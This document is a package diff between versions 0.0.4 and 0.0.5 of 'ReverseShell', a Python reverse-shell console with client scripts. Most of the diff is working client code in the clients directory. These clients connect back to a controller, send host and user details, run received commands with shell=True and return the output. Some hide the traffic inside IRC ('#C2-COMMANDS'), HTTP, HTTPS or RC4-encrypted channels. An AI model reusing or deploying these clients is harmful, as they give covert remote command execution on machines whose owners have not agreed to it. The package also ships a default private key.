# Comparing `tmp/ReverseShell-0.0.4.tar.gz` & `tmp/ReverseShell-0.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "ReverseShell-0.0.4.tar", last modified: Sun Apr 30 19:20:35 2023, max compression
+gzip compressed data, was "ReverseShell-0.0.5.tar", last modified: Sun Apr 30 21:54:27 2023, max compression
```

## Comparing `ReverseShell-0.0.4.tar` & `ReverseShell-0.0.5.tar`

### file list

```diff
@@ -1,25 +1,27 @@
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-30 19:20:35.961567 ReverseShell-0.0.4/
--rw-r--r--   0 kali      (1000) kali      (1000)    35821 2023-04-30 18:10:03.000000 ReverseShell-0.0.4/LICENSE.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       51 2023-04-30 18:10:59.000000 ReverseShell-0.0.4/MANIFEST.in
--rw-r--r--   0 kali      (1000) kali      (1000)     6119 2023-04-30 19:20:35.961567 ReverseShell-0.0.4/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)     5044 2023-04-30 23:50:08.000000 ReverseShell-0.0.4/README.md
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-30 19:20:35.961567 ReverseShell-0.0.4/ReverseShell.egg-info/
--rw-r--r--   0 kali      (1000) kali      (1000)     6119 2023-04-30 19:20:35.000000 ReverseShell-0.0.4/ReverseShell.egg-info/PKG-INFO
--rw-r--r--   0 kali      (1000) kali      (1000)      570 2023-04-30 19:20:35.000000 ReverseShell-0.0.4/ReverseShell.egg-info/SOURCES.txt
--rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-04-30 19:20:35.000000 ReverseShell-0.0.4/ReverseShell.egg-info/dependency_links.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       51 2023-04-30 19:20:35.000000 ReverseShell-0.0.4/ReverseShell.egg-info/entry_points.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       15 2023-04-30 19:20:35.000000 ReverseShell-0.0.4/ReverseShell.egg-info/requires.txt
--rw-r--r--   0 kali      (1000) kali      (1000)       13 2023-04-30 19:20:35.000000 ReverseShell-0.0.4/ReverseShell.egg-info/top_level.txt
--rw-r--r--   0 kali      (1000) kali      (1000)    23201 2023-04-30 19:11:40.000000 ReverseShell-0.0.4/ReverseShell.py
-drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-30 19:20:35.961567 ReverseShell-0.0.4/clients/
--rw-r--r--   0 kali      (1000) kali      (1000)     3258 2023-04-30 22:31:00.000000 ReverseShell-0.0.4/clients/shellclientdns.py
--rw-r--r--   0 kali      (1000) kali      (1000)     3724 2023-04-30 19:18:24.000000 ReverseShell-0.0.4/clients/shellclienthttp_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     3888 2023-04-30 19:18:58.000000 ReverseShell-0.0.4/clients/shellclienthttps_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     4760 2023-04-30 19:16:33.000000 ReverseShell-0.0.4/clients/shellclienthttpsencrypt_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2941 2023-04-30 22:30:34.000000 ReverseShell-0.0.4/clients/shellclientsocketirc.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2153 2023-04-30 22:30:02.000000 ReverseShell-0.0.4/clients/shellclientsockettcp.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2114 2023-04-30 23:10:40.000000 ReverseShell-0.0.4/clients/shellclienttcp.py
--rw-r--r--   0 kali      (1000) kali      (1000)     3151 2023-04-30 19:19:45.000000 ReverseShell-0.0.4/clients/shellclienttcp_advanced.py
--rw-r--r--   0 kali      (1000) kali      (1000)     2176 2023-04-30 22:29:44.000000 ReverseShell-0.0.4/clients/shellclientudp.py
--rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-04-30 19:20:35.961567 ReverseShell-0.0.4/setup.cfg
--rw-r--r--   0 kali      (1000) kali      (1000)     1745 2023-04-30 19:11:52.000000 ReverseShell-0.0.4/setup.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-30 21:54:27.533481 ReverseShell-0.0.5/
+-rw-r--r--   0 kali      (1000) kali      (1000)    35821 2023-05-01 02:52:34.000000 ReverseShell-0.0.5/LICENSE.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       81 2023-05-01 02:53:12.000000 ReverseShell-0.0.5/MANIFEST.in
+-rw-r--r--   0 kali      (1000) kali      (1000)     6212 2023-04-30 21:54:27.533481 ReverseShell-0.0.5/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)     5139 2023-05-01 03:51:20.000000 ReverseShell-0.0.5/README.md
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-30 21:54:27.533481 ReverseShell-0.0.5/ReverseShell.egg-info/
+-rw-r--r--   0 kali      (1000) kali      (1000)     6212 2023-04-30 21:54:27.000000 ReverseShell-0.0.5/ReverseShell.egg-info/PKG-INFO
+-rw-r--r--   0 kali      (1000) kali      (1000)      602 2023-04-30 21:54:27.000000 ReverseShell-0.0.5/ReverseShell.egg-info/SOURCES.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)        1 2023-04-30 21:54:27.000000 ReverseShell-0.0.5/ReverseShell.egg-info/dependency_links.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       51 2023-04-30 21:54:27.000000 ReverseShell-0.0.5/ReverseShell.egg-info/entry_points.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       15 2023-04-30 21:54:27.000000 ReverseShell-0.0.5/ReverseShell.egg-info/requires.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)       13 2023-04-30 21:54:27.000000 ReverseShell-0.0.5/ReverseShell.egg-info/top_level.txt
+-rw-r--r--   0 kali      (1000) kali      (1000)    23271 2023-04-30 21:54:23.000000 ReverseShell-0.0.5/ReverseShell.py
+drwxr-xr-x   0 kali      (1000) kali      (1000)        0 2023-04-30 21:54:27.533481 ReverseShell-0.0.5/clients/
+-rw-r--r--   0 kali      (1000) kali      (1000)     3258 2023-05-01 02:52:34.000000 ReverseShell-0.0.5/clients/shellclientdns.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     3904 2023-05-01 03:37:54.000000 ReverseShell-0.0.5/clients/shellclienthttp_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     4068 2023-05-01 03:38:30.000000 ReverseShell-0.0.5/clients/shellclienthttps_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     4940 2023-05-01 03:38:58.000000 ReverseShell-0.0.5/clients/shellclienthttpsencrypt_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     3122 2023-05-01 03:40:06.000000 ReverseShell-0.0.5/clients/shellclientsocketirc.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2330 2023-05-01 03:39:16.000000 ReverseShell-0.0.5/clients/shellclientsockettcp.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2291 2023-05-01 03:40:24.000000 ReverseShell-0.0.5/clients/shellclienttcp.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     3331 2023-05-01 03:34:52.000000 ReverseShell-0.0.5/clients/shellclienttcp_advanced.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     2176 2023-05-01 02:52:36.000000 ReverseShell-0.0.5/clients/shellclientudp.py
+-rw-r--r--   0 kali      (1000) kali      (1000)     1514 2023-04-28 02:46:30.000000 ReverseShell-0.0.5/server.crt
+-rw-r--r--   0 kali      (1000) kali      (1000)     1732 2023-04-28 02:46:26.000000 ReverseShell-0.0.5/server.key
+-rw-r--r--   0 kali      (1000) kali      (1000)       38 2023-04-30 21:54:27.533481 ReverseShell-0.0.5/setup.cfg
+-rw-r--r--   0 kali      (1000) kali      (1000)     1745 2023-04-30 21:54:10.000000 ReverseShell-0.0.5/setup.py
```

### Comparing `ReverseShell-0.0.4/LICENSE.txt` & `ReverseShell-0.0.5/LICENSE.txt`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.4/PKG-INFO` & `ReverseShell-0.0.5/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: ReverseShell
-Version: 0.0.4
+Version: 0.0.5
 Summary: This package implements an advanced reverse shell console (supports: TCP, UDP, IRC, HTTP and DNS).
 Home-page: https://github.com/mauricelambert/ReverseShell
 Author: Maurice Lambert
 Author-email: mauricelambert434@gmail.com
 Maintainer: Maurice Lambert
 Maintainer-email: mauricelambert434@gmail.com
 License: GPL-3.0 License
@@ -45,14 +45,16 @@
  - Hide commands with IRC protocol
  - Hide commands with DNS (UDP) protocol
  - Hide commands with HTTP protocol
  - Advanced terminal features (required specific packets):
      - Print colored hostname, user and current directory
      - Auto-completion (executables in PATH and files in current directory)
      - Updatable any time you send the specific packet
+ - Auto-restart for TCP client
+ - Very large TCP packet (greater than TCP Window) is working
 
 You can read multiples POC for reverse shell client written in python in the *clients* directory.
 
 I add public and private key for default SSL certificate, is useful for test but **is not secure, create your own certificate to protect your TCP data**.
 
 ## Requirements
```

### Comparing `ReverseShell-0.0.4/README.md` & `ReverseShell-0.0.5/README.md`

 * *Files 3% similar despite different names*

```diff
@@ -16,14 +16,16 @@
  - Hide commands with IRC protocol
  - Hide commands with DNS (UDP) protocol
  - Hide commands with HTTP protocol
  - Advanced terminal features (required specific packets):
      - Print colored hostname, user and current directory
      - Auto-completion (executables in PATH and files in current directory)
      - Updatable any time you send the specific packet
+ - Auto-restart for TCP client
+ - Very large TCP packet (greater than TCP Window) is working
 
 You can read multiples POC for reverse shell client written in python in the *clients* directory.
 
 I add public and private key for default SSL certificate, is useful for test but **is not secure, create your own certificate to protect your TCP data**.
 
 ## Requirements
```

### Comparing `ReverseShell-0.0.4/ReverseShell.egg-info/PKG-INFO` & `ReverseShell-0.0.5/ReverseShell.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: ReverseShell
-Version: 0.0.4
+Version: 0.0.5
 Summary: This package implements an advanced reverse shell console (supports: TCP, UDP, IRC, HTTP and DNS).
 Home-page: https://github.com/mauricelambert/ReverseShell
 Author: Maurice Lambert
 Author-email: mauricelambert434@gmail.com
 Maintainer: Maurice Lambert
 Maintainer-email: mauricelambert434@gmail.com
 License: GPL-3.0 License
@@ -45,14 +45,16 @@
  - Hide commands with IRC protocol
  - Hide commands with DNS (UDP) protocol
  - Hide commands with HTTP protocol
  - Advanced terminal features (required specific packets):
      - Print colored hostname, user and current directory
      - Auto-completion (executables in PATH and files in current directory)
      - Updatable any time you send the specific packet
+ - Auto-restart for TCP client
+ - Very large TCP packet (greater than TCP Window) is working
 
 You can read multiples POC for reverse shell client written in python in the *clients* directory.
 
 I add public and private key for default SSL certificate, is useful for test but **is not secure, create your own certificate to protect your TCP data**.
 
 ## Requirements
```

### Comparing `ReverseShell-0.0.4/ReverseShell.py` & `ReverseShell-0.0.5/ReverseShell.py`

 * *Files 0% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.4"
+__version__ = "0.0.5"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -56,14 +56,15 @@
     "main",
 ]
 
 print(copyright)
 
 from cmd import Cmd
 from sys import exit
+from os.path import join
 from socket import socket
 from os import urandom, name
 from functools import partial
 from contextlib import suppress
 from random import randint, choices
 from collections.abc import Callable
 from shlex import split as shellsplit
@@ -110,19 +111,20 @@
 
     def recv(self) -> bytes:
         """
         This method gets all packets sent.
         """
 
         data = self.sock.recv(65535)
-        self.sock.setblocking(False)
+        # self.sock.setblocking(False)
+        self.sock.settimeout(0.5)
         while True:
             try:
                 data += self.sock.recv(65535)
-            except (BlockingIOError, SSLWantReadError):
+            except (BlockingIOError, SSLWantReadError, TimeoutError) as e:
                 break
 
         self.sock.setblocking(True)
         return data
 
     def handle(self) -> None:
         """
@@ -201,15 +203,15 @@
         """
 
         startfilename = shellsplit(line)[-1]
         return [
             x
             for x in self.executables
             + self.files
-            + ["./" + file for file in self.files]
+            + [join(".", file) for file in self.files]
             if x.startswith(startfilename)
         ]
 
     completedefault = completenames
 
     def default(self, arg: str) -> None:
         """
@@ -638,17 +640,15 @@
 
 
 def parser() -> Namespace:
     """
     This function parses command line arguments.
     """
 
-    arguments = ArgumentParser(
-        description="Advanced reverse shell console."
-    )
+    arguments = ArgumentParser(description="Advanced reverse shell console.")
     protocol = arguments.add_mutually_exclusive_group()
     arguments_add_argument = arguments.add_argument
     protocol_add_argument = protocol.add_argument
     protocol_add_argument(
         "--udp", "-u", action="store_true", help="Use UDP socket."
     )
     protocol_add_argument(
```

### Comparing `ReverseShell-0.0.4/clients/shellclientdns.py` & `ReverseShell-0.0.5/clients/shellclientdns.py`

 * *Files identical despite different names*

### Comparing `ReverseShell-0.0.4/clients/shellclienthttp_advanced.py` & `ReverseShell-0.0.5/clients/shellclienthttp_advanced.py`

 * *Files 4% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.1"
+__version__ = "0.0.3"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -59,19 +59,28 @@
 from os import getcwd, environ, listdir, name
 
 
 def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
-        for file in listdir(directory)
         if exists(directory)
+        for file in listdir(directory)
     ]
 
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
+
 format_ = b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n"
 
 while True:
     with suppress(Exception):
         recevied = b""
         while recevied != b"\6":
             s = socket()
@@ -84,28 +93,28 @@
                         "user": getuser(),
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
                     }
                 ).encode()
             )
-            s.send(
+            sendall(
                 format_.replace(
                     b"{type}", b"application/json; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
                 + data
             )
             recevied = s.recv(65535).split(b"\r\n\r\n", 1)[1]
             s.close()
 
         data = b" "
         while True:
             s = socket()
             s.connect(("127.0.0.1", 1337))
-            s.send(
+            sendall(
                 format_.replace(
                     b"{type}", b"text/plain; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
                 + data
             )
             command = s.recv(65535).split(b"\r\n\r\n", 1)[1].decode()
             p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
```

### Comparing `ReverseShell-0.0.4/clients/shellclienthttps_advanced.py` & `ReverseShell-0.0.5/clients/shellclienthttps_advanced.py`

 * *Files 5% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.1"
+__version__ = "0.0.3"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -60,19 +60,28 @@
 from os import getcwd, environ, listdir, name
 
 
 def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
-        for file in listdir(directory)
         if exists(directory)
+        for file in listdir(directory)
     ]
 
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
+
 format_ = b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n"
 context = _create_unverified_context()
 
 while True:
     with suppress(Exception):
         recevied = b""
         while recevied != b"\6":
@@ -87,29 +96,29 @@
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
                     }
                 ).encode()
             )
             s = context.wrap_socket(s)
-            s.send(
+            sendall(
                 format_.replace(
                     b"{type}", b"application/json; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
                 + data
             )
             recevied = s.recv(65535).split(b"\r\n\r\n", 1)[1]
             s.close()
 
         data = b" "
         while True:
             s = socket()
             s.connect(("127.0.0.1", 1337))
             s = context.wrap_socket(s)
-            s.send(
+            sendall(
                 format_.replace(
                     b"{type}", b"text/plain; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
                 + data
             )
             command = s.recv(65535).split(b"\r\n\r\n", 1)[1].decode()
             p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
```

### Comparing `ReverseShell-0.0.4/clients/shellclienthttpsencrypt_advanced.py` & `ReverseShell-0.0.5/clients/shellclienthttpsencrypt_advanced.py`

 * *Files 5% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.1"
+__version__ = "0.0.3"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -91,19 +91,28 @@
     return iv + bytes(out)
 
 
 def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
-        for file in listdir(directory)
         if exists(directory)
+        for file in listdir(directory)
     ]
 
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
+
 format_ = b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n"
 context = _create_unverified_context()
 
 while True:
     with suppress(Exception):
         recevied = b""
         while recevied != b"\6":
@@ -118,29 +127,29 @@
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
                     }
                 ).encode()
             )
             s = context.wrap_socket(s)
-            s.send(
+            sendall(
                 format_.replace(
                     b"{type}", b"application/json; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
                 + data
             )
             recevied = rc4(s.recv(65535).split(b"\r\n\r\n", 1)[1], True)
             s.close()
 
         data = b" "
         while True:
             s = socket()
             s.connect(("127.0.0.1", 1337))
             s = context.wrap_socket(s)
-            s.send(
+            sendall(
                 format_.replace(
                     b"{type}", b"text/plain; charset=utf-8"
                 ).replace(b"{length}", str(len(data)).encode("latin-1"))
                 + rc4(data)
             )
             command = rc4(
                 s.recv(65535).split(b"\r\n\r\n", 1)[1], True
```

### Comparing `ReverseShell-0.0.4/clients/shellclientsocketirc.py` & `ReverseShell-0.0.5/clients/shellclientsocketirc.py`

 * *Files 13% similar despite different names*

```diff
@@ -53,38 +53,46 @@
 from platform import node
 from socket import socket
 from getpass import getuser
 from contextlib import suppress
 from subprocess import run, PIPE
 from base64 import b64decode, b64encode
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
 while True:
     with suppress(Exception):
         s = socket()
         s.connect(("127.0.0.1", 1337))
-        s.send(
+        sendall(
             b"USER "
             + getuser().encode()
             + b" "
             + node().encode()
             + b" localhost :"
             + getcwd().encode()
             + b"\r\n"
         )
         s.recv(65535)
-        s.send(b"NICK " + getuser().encode() + b"\r\n")
+        sendall(b"NICK " + getuser().encode() + b"\r\n")
         s.recv(65535)
-        s.send(b"JOIN #C2-COMMANDS" + b"\r\n")
+        sendall(b"JOIN #C2-COMMANDS" + b"\r\n")
         ping = s.recv(65535)
         while not ping.startswith(b"PING :"):
             ping = s.recv(65535)
-        s.send(b"PONG :" + ping[6:])
+        sendall(b"PONG :" + ping[6:])
         s.recv(65535)
         data = b" "
         while True:
-            s.send(b"PRIVMSG #C2-COMMANDS :" + b64encode(data) + b"\r\n")
+            sendall(b"PRIVMSG #C2-COMMANDS :" + b64encode(data) + b"\r\n")
             command = b64decode(
                 s.recv(65535).split(maxsplit=3)[3][1:]
             ).decode()
             p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
             data = p.stdout or p.stderr or b" "
         s.close()
```

### Comparing `ReverseShell-0.0.4/clients/shellclientsockettcp.py` & `ReverseShell-0.0.5/clients/shellclienttcp.py`

 * *Files 6% similar despite different names*

```diff
@@ -49,18 +49,25 @@
 
 print(copyright)
 
 from socket import socket
 from contextlib import suppress
 from subprocess import run, PIPE
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
+data = b" "
 while True:
     with suppress(Exception):
         s = socket()
         s.connect(("127.0.0.1", 1337))
-        data = b" "
-        while True:
-            s.send(data)
-            data = s.recv(65535).decode()
-            p = run(data, shell=True, stdout=PIPE, stderr=PIPE)
-            data = p.stdout or p.stderr or b" "
+        sendall(data)
+        command = s.recv(65535).decode()
+        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
+        data = p.stdout or p.stderr or b" "
         s.close()
```

### Comparing `ReverseShell-0.0.4/clients/shellclienttcp.py` & `ReverseShell-0.0.5/clients/shellclientudp.py`

 * *Files 5% similar despite different names*

```diff
@@ -45,21 +45,21 @@
 __license__ = license
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
-from socket import socket
 from contextlib import suppress
 from subprocess import run, PIPE
+from socket import socket, AF_INET, SOCK_DGRAM
 
-data = b" "
 while True:
     with suppress(Exception):
-        s = socket()
-        s.connect(("127.0.0.1", 1337))
-        s.send(data)
-        command = s.recv(65535).decode()
-        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
-        data = p.stdout or p.stderr or b" "
+        s = socket(AF_INET, SOCK_DGRAM)
+        data = b" "
+        while True:
+            s.sendto(data, ("127.0.0.1", 1337))
+            data = s.recv(65535).decode()
+            p = run(data, shell=True, stdout=PIPE, stderr=PIPE)
+            data = p.stdout or p.stderr or b" "
         s.close()
```

### Comparing `ReverseShell-0.0.4/clients/shellclienttcp_advanced.py` & `ReverseShell-0.0.5/clients/shellclienttcp_advanced.py`

 * *Files 8% similar despite different names*

```diff
@@ -20,15 +20,15 @@
 ###################
 
 """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.1"
+__version__ = "0.0.3"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
 This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
@@ -59,19 +59,28 @@
 from os import getcwd, environ, listdir, name
 
 
 def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
-        for file in listdir(directory)
         if exists(directory)
+        for file in listdir(directory)
     ]
 
 
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
+
+
 while True:
     with suppress(Exception):
         recevied = b""
         while recevied != b"\6":
             s = socket()
             s.connect(("127.0.0.1", 1337))
             data = (
@@ -82,20 +91,20 @@
                         "user": getuser(),
                         "cwd": getcwd(),
                         "executables": get_executables(),
                         "files": listdir(),
                     }
                 ).encode()
             )
-            s.send(data)
+            sendall(data)
             recevied = s.recv(65535)
             s.close()
 
         data = b" "
         while True:
             s = socket()
             s.connect(("127.0.0.1", 1337))
-            s.send(data)
+            sendall(data)
             command = s.recv(65535).decode()
             p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
             data = p.stdout or p.stderr or b" "
             s.close()
```

### Comparing `ReverseShell-0.0.4/clients/shellclientudp.py` & `ReverseShell-0.0.5/clients/shellclientsockettcp.py`

 * *Files 19% similar despite different names*

```diff
@@ -45,21 +45,30 @@
 __license__ = license
 __copyright__ = copyright
 
 __all__ = []
 
 print(copyright)
 
+from socket import socket
 from contextlib import suppress
 from subprocess import run, PIPE
-from socket import socket, AF_INET, SOCK_DGRAM
+
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
 
 while True:
     with suppress(Exception):
-        s = socket(AF_INET, SOCK_DGRAM)
+        s = socket()
+        s.connect(("127.0.0.1", 1337))
         data = b" "
         while True:
-            s.sendto(data, ("127.0.0.1", 1337))
+            sendall(data)
             data = s.recv(65535).decode()
             p = run(data, shell=True, stdout=PIPE, stderr=PIPE)
             data = p.stdout or p.stderr or b" "
         s.close()
```

### Comparing `ReverseShell-0.0.4/setup.py` & `ReverseShell-0.0.5/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 from setuptools import setup
 from glob import glob
 
 setup(
     name="ReverseShell",
-    version="0.0.4",
+    version="0.0.5",
     py_modules=["ReverseShell"],
     install_requires=["PythonToolsKit"],
     author="Maurice Lambert",
     author_email="mauricelambert434@gmail.com",
     maintainer="Maurice Lambert",
     maintainer_email="mauricelambert434@gmail.com",
     description=(
```

